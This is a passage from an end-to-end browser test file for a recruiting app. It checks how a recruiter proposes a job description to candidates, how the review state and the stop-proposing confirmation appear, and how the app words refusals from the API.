	test('a job created open is proposed from the editor, sent for review, then stopped from its page', async ({
		page
	}) => {
		test.skip(
			!(await matchingIsOn()),
			'Matching is off in the API under test (GET /me/notifications answers 404): run it with MATCHING=true'
		);
		const title = `Matching engineer ${tag}`;
		await openAsRecruiter(page, '/recruiter/jobs/new');
		await fillOpenJob(page, title);

		// Ticked for a job created open; the choice is kept with the draft
		const choice = page.getByRole('checkbox', { name: 'Propose it to candidates' });
		await expect(choice).toBeChecked();
		await expect(page.locator('[data-matching-choice]')).toContainText(
			'A reviewer reads it first.'
		);
		await choice.uncheck();
		page.on('dialog', (leave) => leave.accept());
		await page.reload();
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(choice).not.toBeChecked();
		await choice.check();

		// Proposed, it names its company: asked before anything is sent
		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(
			page.getByRole('link', { name: /^Company: Name the company: candidates decide/ })
		).toBeVisible();
		await page.getByRole('textbox', { name: 'Company' }).fill('E2E Corp');
		await page.getByRole('button', { name: 'Create job description' }).click();
		await page
			.getByRole('alertdialog', { name: 'Open this job description?' })
			.getByRole('button', { name: 'Open', exact: true })
			.click();
		await expect(page).toHaveURL(JOB_PAGE);
		await expect(toasts(page)).toContainText(
			'Sent for review: a reviewer reads it before it is proposed to candidates.'
		);
		const id = JOB_PAGE.exec(new URL(page.url()).pathname)![1];
		const stored = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect(stored.matching.enabledAt).toBeTruthy();
		expect(stored.matching.review.status).toBe('pending');

		// Its page: in review, proposed to nobody until then
		const panel = page.locator('[data-matching-panel]');
		const toggle = panel.getByRole('checkbox', { name: /Propose this job to candidates/ });
		const flip = () => panel.getByText('Propose this job to candidates', { exact: true }).click();
		await expect(toggle).toBeChecked();
		await expect(panel.locator('[data-matching-state]')).toContainText('In review');
		await expect(panel).toContainText('Until then it is proposed to nobody.');
		await expect(panel.getByRole('link', { name: 'Review candidates' })).toHaveCount(0);

		// Stopped, asked first: cancelled, it stays proposed
		await flip();
		const stop = page.getByRole('alertdialog', { name: 'Stop proposing this job?' });
		await expect(stop).toContainText("It leaves every candidate's list at once.");
		await stop.getByRole('button', { name: 'Cancel' }).click();
		await expect(stop).toBeHidden();
		await expect(toggle).toBeChecked();
		await flip();
		await stop.getByRole('button', { name: 'Stop proposing' }).click();
		await expect(toasts(page)).toContainText('No longer proposed to candidates');
		await expect(toggle).not.toBeChecked();
		await expect(panel.locator('[data-matching-state]')).toHaveCount(0);
		expect(
			(await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json()).matching.enabledAt
		).toBe(null);

		// Turned on again from its page: unchanged since, it goes back to review as it was
		await flip();
		await expect(toasts(page)).toContainText('Sent for review');
		await expect(panel.locator('[data-matching-state]')).toContainText('In review');
	});

	test('the switch says in words why it was refused, with the way to fix it', async ({ page }) => {
		const title = `Refused matching ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'open' });
		// Matching on or off in the API: the posting is answered as it is while on
		await page.route(`${API_URL}/recruiter/jobs/${id}`, async (route: Route) => {
			if (route.request().method() !== 'GET') return route.fallback();
			const response = await route.fetch();
			await route.fulfill({
				response,
				json: { ...(await response.json()), matching: { enabledAt: null, review: null } }
			});
		});
		const refusals = [
			{
				status: 422,
				json: { type: 'validation', on: 'body', property: 'company', message: 'Name the company' }
			},
			{ status: 409, text: 'You can propose 10 jobs to candidates at once' },
			{ status: 409, text: 'Only an open job description can be proposed to candidates' }
		];
		const asked = await stubApi(
			page,
			'PUT',
			`/jobs/${id}/matching`,
			(_request, index) => refusals[index]
		);
		await openAsRecruiter(page, `/recruiter/jobs/${id}`);

		const panel = page.locator('[data-matching-panel]');
		const toggle = panel.getByRole('checkbox', { name: /Propose this job to candidates/ });
		const flip = () => panel.getByText('Propose this job to candidates', { exact: true }).click();
		await expect(panel).toContainText('A reviewer reads it before any candidate sees it.');
		await flip();
		const refused = panel.getByRole('alert');
		await expect(refused).toContainText('Name the company first');
		await expect(refused.getByRole('link', { name: 'Edit the job description' })).toHaveAttribute(
			'href',
			`/recruiter/jobs/${id}/edit`
		);
		await expect(toggle).not.toBeChecked();
		await flip();
		await expect(refused).toContainText(
			'You can propose 10 job descriptions to candidates at once: stop proposing one to propose this one.'
		);
		await flip();
		await expect(refused).toContainText(
			'Only an open job description can be proposed to candidates: open it first.'
		);
		expect(asked.map((request) => request.postDataJSON())).toEqual([
			{ enabled: true },
			{ enabled: true },
			{ enabled: true }
		]);
	});
});
